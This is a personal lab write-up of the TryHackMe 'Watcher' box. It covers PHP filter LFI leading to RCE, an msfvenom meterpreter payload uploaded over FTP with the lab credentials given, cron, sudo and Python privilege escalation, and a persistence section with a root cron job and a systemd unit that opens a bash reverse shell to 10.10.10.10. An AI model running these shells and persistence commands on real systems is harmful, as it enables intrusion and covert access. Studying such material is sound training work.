# Watcher Helped

Name: Watcher
Date:  17/3/2023
Difficulty: Medium  
Goals:  
- Azure Storage
- Azure Resilience 
- Azure Hybrid-Cloud
Learnt:
- `php://filter` details
- Linux Persistence - systemd.
Beyond Root:
- Azure Storage, Resilience and Hybrid-Cloud  Contextualization - Expand on [[PhotoBomb-Helped-Through]]
- php filter research and remediation
- Make a crontab Persistence with `crontab -e`
For the [[Sharp-Helped-Through]]
- Governance Contextualization
- Azure AD


Given the lucrious amount of non computer work have this week and the poor state of my previous day off I decided to warm up with turning this TryHackMe machine into a helped-through with the [Alh4zr3d's Funday Sunday](https://www.youtube.com/watch?v=26Sgu9RwBpQ). Secondly to make sure I do not burnout on Microsoft Azure related details into adminstrating the cloud and ODing with Azure written prepending every item and word in 100 metre radius, this will beyond with a another recontextualization. I want then connect the [[PhotoBomb-Helped-Through]] recontextualization and another Box for Sunday as I anticipate a hellscape of a day and almost certianly bare-almost-braindead levels of cognitive functioning.

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Markdown/Watcher/Screenshots/ping.png)

Nikto and Nuclei both read the robots.txt. .txt for flag_one.txt.
```bash
curl http://10.10.183.138/flag_1.txt
```
Nikto 127.0.1.1 

Content Busting with `feroxbuster` and common.txt wordlist indicate anti-bruteforcing measures on the box. Using a small wordlist reduces the recursive madness that ensues. I did not finish it for data collection purposes.exclusively.

Gospider is an awesome tool will just find urls and forms in source 
![](gospiderisawesome.png)

In this instance it looks as if we has a potential vulnerable php function. 

![](lfipasswd.png)

I ran  hydra against FTP with Default credential and rockyou with users. 
![](hydradftftp.png)

Not being entirely strigent in writing this up for whatever reason as I already had this flag.
![](ftpusercredentials.png)

While I research php filters. I think the only php attack I have not memorized. I have yet to do a box requiring php filters. 
```php
php://filter/read=convert.base64-encode/resource=post.php
```

Alh4zr3d does super smart method of using php filter to read file off the server that we using to exploit the machine to exploit it better.

PHP Filters are a powerful wrappers of lots a functionality that take input and perform operations on it without developer having to write in-house checks, filters, etc against common input to website.
- [Validation Filters perform type and pattern checks](https://www.php.net/manual/en/filter.filters.validate.php)
- [Sanitization Filters perform string operations to modify unsafe input](https://www.php.net/manual/en/filter.filters.sanitize.php)
- [Only other is "callback" where all flags are ignored](https://www.php.net/manual/en/filter.filters.misc.php)
- [PHP Filter flags](https://www.php.net/manual/en/filter.filters.flags.php) provides developers to filter by builtin conditions-on-passed-input, encode the input.

File inclusion vulnerability exists due to how php filters are used with `include()`

[LFI / RFI using PHP://filters](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers)
```php
// only php://filter is case insensitive
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
// They can be chained together with:
// | or /
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
// base64encode only for limit exfil - buffer size 8192 bytes
```
- [PHP Documentation base64encode](https://www.php.net/manual/en/function.base64-encode.php)
- [Filter Chains can used to chain encodings till a desired payload - yikes](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
	- Generate PHP filter chains with [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
	- Junk characters do end up appended to the end
- [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI2RCE.py)
- Consider [Hacktrick improves on a Alles CTF script to get LFI2RCE vai PHP filter](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)

Using php filter from above
```php
http://10.10.34.222/post.php?post=pHp://FilTer/convert.base64-encode/resource=post.php
```
You get:
```php
PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CiAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iIj4KICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iTWFyayBPdHRvLCBKYWNvYiBUaG9ybnRvbiwgYW5kIEJvb3RzdHJhcCBjb250cmlidXRvcnMiPgogICAgPG1ldGEgbmFtZT0iZ2VuZXJhdG9yIiBjb250ZW50PSJKZWt5bGwgdjQuMS4xIj4KICAgIDx0aXRsZT5Db3JrcGxhY2VtYXRzPC90aXRsZT4KCiAgICA8bGluayByZWw9ImNhbm9uaWNhbCIgaHJlZj0iaHR0cHM6Ly9nZXRib290c3RyYXAuY29tL2RvY3MvNC41L2V4YW1wbGVzL2FsYnVtLyI+Cgo8bGluayBocmVmPSJjc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgPHN0eWxlPgogICAgICAuYmQtcGxhY2Vob2xkZXItaW1nIHsKICAgICAgICBmb250LXNpemU6IDEuMTI1cmVtOwogICAgICAgIHRleHQtYW5jaG9yOiBtaWRkbGU7CiAgICAgICAgLXdlYmtpdC11c2VyLXNlbGVjdDogbm9uZTsKICAgICAgICAtbW96LXVzZXItc2VsZWN0OiBub25lOwogICAgICAgIC1tcy11c2VyLXNlbGVjdDogbm9uZTsKICAgICAgICB1c2VyLXNlbGVjdDogbm9uZTsKICAgICAgfQoKICAgICAgQG1lZGlhIChtaW4td2lkdGg6IDc2OHB4KSB7CiAgICAgICAgLmJkLXBsYWNlaG9sZGVyLWltZy1sZyB7CiAgICAgICAgICBmb250LXNpemU6IDMuNXJlbTsKICAgICAgICB9CiAgICAgIH0KICAgIDwvc3R5bGU+CiAgICA8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+CiAgICA8bGluayBocmVmPSJhbGJ1bS5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPGhlYWRlcj4KICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBiZy1kYXJrIiBpZD0ibmF2YmFySGVhZGVyIj4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTggY29sLW1kLTcgcHktNCI+CiAgICAgICAgICA8aDQgY2xhc3M9InRleHQtd2hpdGUiPkFib3V0PC9oND4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNCBvZmZzZXQtbWQtMSBweS00Ij4KICAgICAgICAgIDxoNCBjbGFzcz0idGV4dC13aGl0ZSI+Q29udGFjdDwvaDQ+CiAgICAgICAgICA8dWwgY2xhc3M9Imxpc3QtdW5zdHlsZWQiPgogICAgICAgICAgICA8bGk+PGEgaHJlZj0iIyIgY2xhc3M9InRleHQtd2hpdGUiPkZvbGxvdyBvbiBUd2l0dGVyPC9hPjwvbGk+CiAgICAgICAgICAgIDxsaT48YSBocmVmPSIjIiBjbGFzcz0idGV4dC13aGl0ZSI+TGlrZSBvbiBGYWNlYm9vazwvYT48L2xpPgogICAgICAgICAgICA8bGk+PGEgaHJlZj0iIyIgY2xhc3M9InRleHQtd2hpdGUiPkVtYWlsIG1lPC9hPjwvbGk+CiAgICAgICAgICA8L3VsPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogIDwvZGl2PgogIDxkaXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZGFyayBiZy1kYXJrIHNoYWRvdy1zbSI+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIgZC1mbGV4IGp1c3RpZnktY29udGVudC1iZXR3ZWVuIj4KICAgICAgPGEgaHJlZj0iLyIgY2xhc3M9Im5hdmJhci1icmFuZCBkLWZsZXggYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICA8c3Ryb25nPkNvcmtwbGFjZW1hdHM8L3N0cm9uZz4KICAgICAgPC9hPgogICAgICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFySGVhZGVyIiBhcmlhLWNvbnRyb2xzPSJuYXZiYXJIZWFkZXIiIGFyaWEtZXhwYW5kZWQ9ImZhbHNlIiBhcmlhLWxhYmVsPSJUb2dnbGUgbmF2aWdhdGlvbiI+CiAgICAgICAgPHNwYW4gY2xhc3M9Im5hdmJhci10b2dnbGVyLWljb24iPjwvc3Bhbj4KICAgICAgPC9idXR0b24+CiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9oZWFkZXI+Cgo8bWFpbiByb2xlPSJtYWluIj4KCjxkaXYgY2xhc3M9InJvdyI+CiA8ZGl2IGNsYXNzPSJjb2wtMiI+PC9kaXY+CiA8ZGl2IGNsYXNzPSJjb2wtOCI+CiAgPD9waHAgaW5jbHVkZSAkX0dFVFsicG9zdCJdOyA/PgogPC9kaXY+CjwvZGl2PgoKPC9tYWluPgoKPGZvb3RlciBjbGFzcz0idGV4dC1tdXRlZCI+CiAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgIDxwIGNsYXNzPSJmbG9hdC1yaWdodCI+CiAgICAgIDxhIGhyZWY9IiMiPkJhY2sgdG8gdG9wPC9hPgogICAgPC9wPgogICAgPHA+JmNvcHk7IENvcmtwbGFjZW1hdHMgMjAyMDwvcD4KICA8L2Rpdj4KPC9mb290ZXI+CjwvaHRtbD4K
```

Base64 decoding the post.php
```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v4.1.1">
    <title>Corkplacemats</title>

    <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/album/">

<link href="css/bootstrap.min.css" rel="stylesheet">

    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>
    <!-- Custom styles for this template -->
    <link href="album.css" rel="stylesheet">
  </head>
  <body>
    <header>
  <div class="collapse bg-dark" id="navbarHeader">
    <div class="container">
      <div class="row">
        <div class="col-sm-8 col-md-7 py-4">
          <h4 class="text-white">About</h4>
        </div>
        <div class="col-sm-4 offset-md-1 py-4">
          <h4 class="text-white">Contact</h4>
          <ul class="list-unstyled">
            <li><a href="#" class="text-white">Follow on Twitter</a></li>
            <li><a href="#" class="text-white">Like on Facebook</a></li>
            <li><a href="#" class="text-white">Email me</a></li>
          </ul>
        </div>
      </div>
    </div>
  </div>
  <div class="navbar navbar-dark bg-dark shadow-sm">
    <div class="container d-flex justify-content-between">
      <a href="/" class="navbar-brand d-flex align-items-center">
        <strong>Corkplacemats</strong>
      </a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarHeader" aria-controls="navbarHeader" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
    </div>
  </div>
</header>

<main role="main">

<div class="row">
 <div class="col-2"></div>
 <div class="col-8">
  <?php include $_GET["post"]; ?>
 </div>
</div>

</main>

<footer class="text-muted">
  <div class="container">
    <p class="float-right">
      <a href="#">Back to top</a>
    </p>
    <p>&copy; Corkplacemats 2020</p>
  </div>
</footer>
</html>

```

Using php filter chain generator
![1080](synactivdemo.png)
Tibs says the discoverer utilized the `temp` which will always be there.

And it works!
![](wowphpfilterchaining.png)
Some junk characters do end up appended to the end

- Find the conf and logging?
	- Log poisoning?


I also want to try read the entire file system with ffuf using SecLists and the post.php and tdo the smart thing of using a burpsuit request as a file with ffuf.
![](addtheFUZZ.png)

Initial attempts failing and troubleshooting why tried som of the list
![](disallowedlist.png)

2422 is the size of the original webpage. Useing [DragonJAR's wordlist](https://github.com/DragonJAR/Security-Wordlist)
```bash
ffuf -request postvuln.req -request-proto http -w LFI-wl-Linux.txt:FUZZ -mc all -fs 2422 > ffufthefs.wrk
```

Had a go at sed regex, which will look into oneline `sed`-ing raw ffuf output, but this work
```bash
cat ffufthefs.wrk | awk -F* '{print $2}' | tr -d '\n' | tr -s ':' '\n' | sed 's/FUZZ//g'
```

see watcherfilesys-enum, from this although more PoC 
![](busterwefoundthebuster.png)
Buster/sid is debian version disclosure. This is a actually a false positive and not a good way to verify OS.

https://github.com/ajkhoury starred a https://github.com/0vercl0k - looks insane https://github.com/0vercl0k/clairvoyance.  I then stop trying hydra.
![](noeasyrockhydrayouintothewatcherbox.png)

## Exploit

System is not disabled on the box
```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
```

![](rcewithfilterchaining.png)

But I could spawn a reverse shell with the previous probably because I am providing more characters after a whitespace  
```bash
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
```

## Foothold

The intended path was to upload a file to ftp and use LFI to get this. I understand mostly in self communication that the biological warfare of colds and flu are rampant, but this stuff all seems way to easy and I am somewhat shocked at me not piecing this together it is this easy. Due to me wanting to practice metasploit at somepoint during the week. So I tried a https meterpreter shell becuase I have not tried these before.

```bash
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=tun0 LPORT=4444 -f elf -o met.elf
# FTP and drop the file
ftp $IP
# ftpuser : givemefiles777
cd files
put met.elf
exit
curl http://10.10.34.222/post.php?post=/home/ftpuser/ftp/files/met.elf
```

This is not the entirely correct, because the webpage can not execute the elf, it can only read so the webshell has to reflected in the language webserver as [0xsans](https://0xsanz.medium.com/watcher-tryhackme-d7defe292fb8) was successful. From this point I paused the video and finished the entire box solo. Trying the intended way:

```bash
curl http://10.10.34.222/post.php?post=/home/ftpuser/ftp/files/monkey.php
```

and the callback
![](intendedway.png)

Regardless I will use the meterpeter shell for root instead.
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# background
stty raw -echo;fg
stty rows $rows cols $rows
```

The first shell with the `php://filter` 
![](revshell.png)

Flag is here the rest are in user home directories
![](awesomewaytogetflag3.png)

A note to toby
![](cronstogetthingsdone.png)


## PrivEsc www-data to Toby

As my brain gently melts...as we have sudo to run anything the most simple escalation 
![](sutotoby.png)
My brain went in various directions before the obvious was made clear by Sans. Tilted I execised realising something was wrong
```bash
sudo -u toby /bin/bash
```

## PrivEsc Toby to Mat

The rest was without help
![](matcrontobysprivesc.png)

This script copies the cow.jpg to tmp, making it more valuable somehow because I can't see it
![](copymatscowpicture.png)

So we edit and wait
![](andwait.png)

For the callback
![](matrv.png)

## PrivEsc Mat to Will

Then for mat we have crossing of the sudo streams 
![](willtomattenjoypython.png)

As www-data I enumerated the box 
![](matstroveofprivesc.png)

But we own the cmd.py!
![](weownthecmdpy.png)

Call you os.system before it get handled :)
![](babyracecondition.png)

## PrivEsc Will to Root

Stream crossed into Will...
![](nightmareavoided.png)

Find Will's files
```bash
find / -user $USER -ls 2>/dev/null | grep -v '/run/\|/proc/\|/sys/'
```
And lxc is on the box
![](rechmodtheconfforlxc.png)
but it points to `/mat/.config`... 

![](andlxd.png)

Will can read the key
![](specialbackupkey.png)

It is just an RSA for ssh.
![](secretrsa.png)

And Root:
![](root.png)

In the end i ran the meterpreter as root for beyond root.

## Beyond Root

Patching your way back as part of my clean up is what APTs do so it is best to do that. 
```bash
mv cow.sh.bak cow.sh
mv cmd.py.bak cmd.py
rm /home/ftpuser/ftp/files/monkey.php
```
Not much here really

#### Linux Persistence List

- Cron Persistence updating, fixing, trick research
```bash
# Could use crontab -e, but I want to make sure the below worked
CT="\n1 * * * *   root    ./dev/shm/met.elf\n"
printf "$CT" | crontab -
```

Will have restart the box which you cant do, but the syntax works
![](cronpersistence.png)

Tried alias
![](insertaliaspers.png)
This is aweful, but PoC it is fun. 
![](hangingls.png)
And bang
![](bangls.png)

[Systemd persistence](https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8)
```bash
touch ~/.config/system/root/persistence.service
# Make p.service 
[Unit]  
Description=Just a reverse shell

[Service]  
ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/8008 0>&1'  
Restart=always  
RestartSec=60

[Install]  
WantedBy=default.target
```

Enable and start service
```bash
systemctl --user enable persistence.service
systemctl --user start persistence.service 
# systemd --user only started on login
# Configure with root run:
loginctl enable-linger
# Check if already set:
/var/lib/systemd/linger/$username_is_here_if_enabled
```

#### Linux CLI wizardry

- `sed` against special characters-and-multiline-into-one-line on the ffuf file challenge

#### Hardening Root on Linux with HackerSploit 

[HackerSploits' configure Root Access](https://www.youtube.com/watch?v=9lXW0obOGOY)

Remediating the sudo privileges on Watcher
```bash
# configure with
visudo 
```

#### Azure 

Azure Storage, Resilience and Hybrid-Cloud  Contextualization - Expand on [[PhotoBomb-Helped-Through]]